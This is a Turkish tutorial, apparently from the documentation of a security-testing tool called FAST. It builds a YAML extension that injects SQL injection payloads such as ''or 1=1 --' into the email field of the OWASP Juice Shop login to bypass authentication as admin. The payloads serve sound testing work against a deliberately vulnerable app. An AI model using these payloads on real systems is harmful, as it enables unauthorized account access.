[link-app-examination]:     app-examination.md
[link-points]:              ../points/intro.md
[link-using-extension]:     ../using-extension.md
[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section

[doc-collect-phase]:        ../phase-collect.md
[doc-match-phase]:          ../phase-match.md
[doc-modify-phase]:         ../phase-modify.md
[doc-generate-phase]:       ../phase-generate.md
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project


#   Değiştirici Uzantının Oluşturulması

Bu belgede açıklanan uzantı, gelen temel isteği değiştirerek içine bazı payload'lar enjekte edecektir. Bu payload'lar, hedef uygulamanın [“OWASP Juice Shop”][link-juice-shop] giriş formundaki SQLi güvenlik açığının sömürülmesine yol açabilir.
  
##  Hazırlıklar

Bir FAST uzantısı oluşturmadan önce şu adımların atılması şiddetle önerilir:
1.  Uzantıyı oluşturduğunuz [hedef uygulamanın davranışını inceleyin][link-app-examination].
2.  Bir uzantı için [nokta oluşturma prensiplerini okuyun][link-points].


##  Uzantının Oluşturulması

Uzantıyı tanımlayan bir dosya oluşturun (ör. `mod-extension.yaml`) ve gerekli bölümlerle doldurun:

1.  [**`meta-info` bölümü**][link-meta-info].

    Uzantının tespit etmeye çalışacağı güvenlik açığının açıklamasını hazırlayın.
    
    * zafiyet başlığı: `OWASP Juice Shop SQLi (mod extension)`
    * zafiyet açıklaması: `Demo of SQLi in OWASP Juice Shop (Admin Login)`
    * zafiyet türü: SQL enjeksiyonu
    * zafiyet tehdit seviyesi: yüksek
    
    Karşılık gelen `meta-info` bölümü aşağıdaki gibi görünmelidir:
    
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
    ```
    
2.  **`collect` bölümü, [Collect aşaması][doc-collect-phase]**.
    
    Giriş yapmaya çalışırken REST API `POST /rest/user/login` yöntemi çağrılır.
    
    Zafiyet testleri, POST isteğinde iletilen her veri parçası için aynı şekilde gerçekleştirileceğinden, API’ye gönderilen her bir oturum açma amaçlı temel istek için test istekleri oluşturmanıza gerek yoktur.
    
    Uzantıyı, API oturum açma isteğini aldığında bir kez çalışacak şekilde ayarlayın. Bunu yapmak için uzantıya benzersizlik koşuluna sahip Collect aşamasını ekleyin.

    API’ye oturum açmak için gönderilen `/rest/user/login` isteği şunlardan oluşur:

    1.  yolun `rest` değerine sahip ilk kısmı,
    2.  yolun `user` değerine sahip ikinci kısmı ve
    3.  `login` işlem yöntemi
    
    Bu değerlere atıfta bulunan karşılık gelen noktalar aşağıdakilerdir:

    1.  yolun ilk kısmı için `PATH_0_value`
    2.  yolun ikinci kısmı için `PATH_1_value`
    3.  `login` işlem yöntemi için `ACTION_NAME_value`
    
    Bu üç öğenin kombinasyonunun benzersiz olması gerektiği koşulunu eklerseniz, uzantı API’ye yapılan ilk `/rest/user/login` temel isteği için çalışacaktır (böyle bir istek benzersiz olarak kabul edilecek ve sonraki tüm oturum açma istekleri benzersiz olmayacaktır). 
    
    Uzantı YAML dosyasına karşılık gelen `collect` bölümünü ekleyin. 
    
    ```
    collect:
      - uniq:
        - [PATH_0_value, PATH_1_value, ACTION_NAME_value]
    ```

3.  **`match` bölümü, [Match aşaması][doc-match-phase]**.
    
    Oluşturduğumuz uzantı giriş formunda bulunan güvenlik açıklarını sömüreceği için, gelen temel isteğin gerçekten API’ye yapılan oturum açma isteği olup olmadığını kontrol etmek gereklidir.
    
    Uzantıyı yalnızca bir temel istek aşağıdaki URI’ı hedeflediğinde çalışacak şekilde yapılandırın: `/rest/user/login`. Alınan isteğin gerekli öğeleri içerip içermediğini kontrol eden Match aşamasını ekleyin. Bu, aşağıdaki `match` bölümü kullanılarak yapılabilir:

    ```
    match:
      - PATH_0_value: 'rest'
      - PATH_1_value: 'user'
      - ACTION_NAME_value: 'login'
    ```

4.  **`modify` bölümü, [Modify aşaması][doc-modify-phase]**.
    
    Aşağıdaki hedeflere ulaşmak için temel isteğin değiştirilmesinin gerektiğini varsayalım:
    * `Accept-Language` HTTP başlık değerini temizlemek (bu değer, zafiyetin tespit edilmesi için gerekli değildir).
    * `email` ve `password` parametrelerinin gerçek değerlerini nötr `dummy` değerleriyle değiştirmek.
    
    Yukarıda açıklanan hedefleri karşılayacak şekilde isteği değiştiren aşağıdaki `modify` bölümünü uzantıya ekleyin:
    
    ```
    modify:
      - "HEADER_ACCEPT-LANGUAGE_value": ""
      - "POST_JSON_DOC_HASH_email_value": "dummy"
      - "POST_JSON_DOC_HASH_password_value": "dummy"
    ```
    
    !!! info "İstek öğeleri açıklama söz dizimi"
        İstek verileri JSON formatında `<key: value>` çiftleri halinde tutulduğundan, `email` öğesinin değerine atıfta bulunan nokta yukarıda gösterildiği gibi görünecektir. `password` öğesinin değerine atıfta bulunan nokta benzer bir yapıya sahiptir.
        
        Noktaların nasıl oluşturulacağı hakkında ayrıntılı bilgi için bu [bağlantıya][link-points] gidin.
 
5.  **`generate` bölümü, [Generate aşaması][doc-generate-phase]**.

    Hedef uygulamadaki SQL enjeksiyonu güvenlik açığını sömürmek için, temel istekteki `email` parametresinin değerini değiştirmesi gereken iki payload olduğu bilinmektedir:
    * `'or 1=1 --`
    * `admin@juice-sh.op'--`
        
    !!! info "Payload'ın değiştirilmiş isteğe eklenmesi"
        Uzantı `modify` bölümünü içerdiğinden payload daha önce değiştirilmiş isteğe eklenecektir. Dolayısıyla ilk payload `email` alanına eklendikten sonra test istek verileri aşağıdaki gibi görünmelidir:
    
        ```
        {
            "email": "'or 1=1 --",
            "password":"dummy"
        }
        ```
    
        Seçilen payload'lar sayesinde oturum açmak için herhangi bir parola kullanılabildiğinden, Modify aşaması uygulandıktan sonra `dummy` değerine sahip olacak parola alanına payload eklemeye gerek yoktur.
    
        Yukarıda tartışılan gereksinimleri karşılayan test isteklerini oluşturacak `generate` bölümünü ekleyin.
    
        ```
        generate:
          - payload:
            - "'or 1=1 --"
            - "admin@juice-sh.op'--"
          - into: "POST_JSON_DOC_HASH_email_value"
          - method:
            - replace
        ```

6.  **`detect` bölümü, [Detect aşaması][doc-detect-phase]**.
    
    Aşağıdaki koşullar, kullanıcı kimlik doğrulamasının yönetici haklarıyla başarılı olduğunu gösterir:
    * Yanıt gövdesinde değeri `1` olan alışveriş sepeti tanımlayıcı parametresinin bulunması. Parametre JSON formatındadır ve aşağıdaki gibi görünmelidir:
    
        ```
        "bid":1
        ```
    
    * Yanıt gövdesinde `admin@juice-sh.op` değerine sahip kullanıcı e-posta parametresinin bulunması. Parametre JSON formatındadır ve aşağıdaki gibi görünmelidir:
    
        ```
         "umail":"admin@juice-sh.op"
        ```
    
    Yukarıda açıklanan koşullara göre saldırının başarılı olup olmadığını kontrol eden `detect` bölümünü ekleyin.
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```
    
!!! info "Özel karakterlerin kaçışlanması"
    Dizelerdeki özel karakterleri kaçışlamayı unutmayın.

##  Uzantı Dosyası

Artık `mod-extension.yaml` dosyası, uzantının çalışması için gereken bölümlerin tam setini içeriyor. Dosya içeriğinin listesi aşağıdadır:

??? info "mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'

    collect:
      - uniq:
        - [PATH_0_value, PATH_1_value, ACTION_NAME_value]

    match:
      - PATH_0_value: 'rest'
      - PATH_1_value: 'user'
      - ACTION_NAME_value: 'login'

    modify:
      - "HEADER_ACCEPT-LANGUAGE_value": ""
      - "POST_JSON_DOC_HASH_email_value": "dummy"
      - "POST_JSON_DOC_HASH_password_value": "dummy"

    generate:
      - payload:
        - "'or 1=1 --"
        - "admin@juice-sh.op'--"
      - into: "POST_JSON_DOC_HASH_email_value"
      - method:
        - replace

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

##  Uzantının Kullanımı

Oluşturulan ifadeyi nasıl kullanacağınız hakkında ayrıntılı bilgi için [bu belgeyi][link-using-extension] okuyun.